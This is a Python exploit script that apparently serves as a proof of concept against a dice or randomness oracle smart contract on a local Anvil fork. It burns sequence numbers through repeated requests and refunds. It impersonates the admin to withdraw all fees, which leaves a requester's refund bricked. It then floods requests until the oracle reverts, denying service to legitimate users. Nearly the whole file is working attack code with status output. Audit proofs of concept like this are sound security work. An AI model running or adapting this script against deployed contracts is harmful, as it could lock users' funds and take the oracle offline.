#!/usr/bin/env python3
"""DiceEntropy fork-attack v3: seq from indexed topic[3]; full event topic compare."""
import json, urllib.request, time, subprocess

RPC = "http://localhost:8545"
DICE = "0xd8a0680e7699526b57140ed4eafdcc7219dc0a0c"
PROVIDER = "0x8741b8a825644D9Ef18Faf2DAB5e9b47B900F2b6"
ADMIN = "0x4acd2c88a239a924e47fc4995114ca1bb0ca3cad"
ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
FEE = 25_000_000_000_000

def keccak(sig):
    out = subprocess.run(["/root/.foundry/bin/cast", "keccak", sig], capture_output=True, text=True).stdout.strip()
    return out  # full 0x..64

SEL_REQ = keccak("requestV2(address,bytes32,uint32)")[:10]
SEL_REF = keccak("refundRequest(address,uint64)")[:10]
SEL_WITHDRAW = keccak("withdrawFees(uint128)")[:10]
EVT_REQ = keccak("Requested(address,address,uint64,bytes32,uint32,bytes)").lower()
print("sel:", SEL_REQ, SEL_REF, SEL_WITHDRAW)

def rpc(method, params):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json"})
    for _ in range(6):
        try:
            return json.loads(urllib.request.urlopen(req, timeout=30).read())
        except Exception:
            time.sleep(1)
    raise RuntimeError("rpc fail")

def send(to, data, value=0, frm=ATTACKER):
    tx = {"from": frm, "to": to, "data": data, "value": hex(value)}
    r = rpc("eth_sendTransaction", [tx])
    if "error" in r:
        raise RuntimeError("send fail: " + str(r["error"]))
    h = r["result"]
    for _ in range(50):
        rec = rpc("eth_getTransactionReceipt", [h]).get("result")
        if rec:
            return rec
        time.sleep(0.2)
    raise RuntimeError("no receipt")

def mine(n):
    rpc("anvil_mine", [hex(n)])

def do_request(idx):
    secret = bytes([idx % 251 + 1]) * 32
    data = SEL_REQ + PROVIDER[2:].lower().zfill(64) + secret.hex() + "0" * 64
    rec = send(DICE, data, value=FEE)
    seq = None
    for log in rec.get("logs", []):
        if log["topics"][0].lower() == EVT_REQ:
            seq = int(log["topics"][3], 16)
    return rec, seq

def do_refund(seq):
    data = SEL_REF + PROVIDER[2:].lower().zfill(64) + hex(seq)[2:].zfill(64)
    return send(DICE, data)

seqs = []
print("== burn demo: request x4 -> refund x4 ==")
for i in range(4):
    rec, seq = do_request(i)
    print(f"  request {i}: status={rec.get('status')} seq={seq}")
    seqs.append(seq)
mine(8)
for s in seqs:
    rec = do_refund(s)
    print(f"  refund seq {s}: status={rec.get('status')}")

print("\n== F1 demo: admin withdrawFees -> stuck requester refund bricked ==")
rec, seq = do_request(99)
print(f"  request seq {seq} (to be stuck)")
mine(8)
rpc("anvil_setBalance", [ADMIN, hex(100 * 10**18)])
rpc("anvil_impersonateAccount", [ADMIN])
rec_w = send(DICE, SEL_WITHDRAW + hex(2**128 - 1)[2:].zfill(64), frm=ADMIN)
print(f"  admin withdrawFees: status={rec_w.get('status')}")
rpc("anvil_stopImpersonatingAccount", [ADMIN])
try:
    rec_r = do_refund(seq)
    print(f"  refund after withdraw: status={rec_r.get('status')} (UNEXPECTED OK)")
except Exception as e:
    print(f"  refund after withdraw FAILED -> F1 confirmed: {str(e)[:110]}")

print("\n== exhaustion: request until revert ==")
burned = 0
stop = None
last_seq = None
for i in range(400):
    try:
        rec, seq = do_request(1000 + i)
        burned += 1
        last_seq = seq
        if burned % 25 == 0:
            print(f"  burned {burned}... last seq {last_seq}")
    except Exception as e:
        stop = str(e)[:160]
        break
print(f"total burned: {burned} | last assigned seq: {last_seq}")
print("exhaustion revert:", stop or "never reverted in 400")
if stop:
    try:
        rec, seq = do_request(9999)
        print("post-exhaustion legit request: OK seq %s — UNEXPECTED" % seq)
    except Exception as e:
        print("post-exhaustion legit request REVERTS -> oracle down:", str(e)[:100])
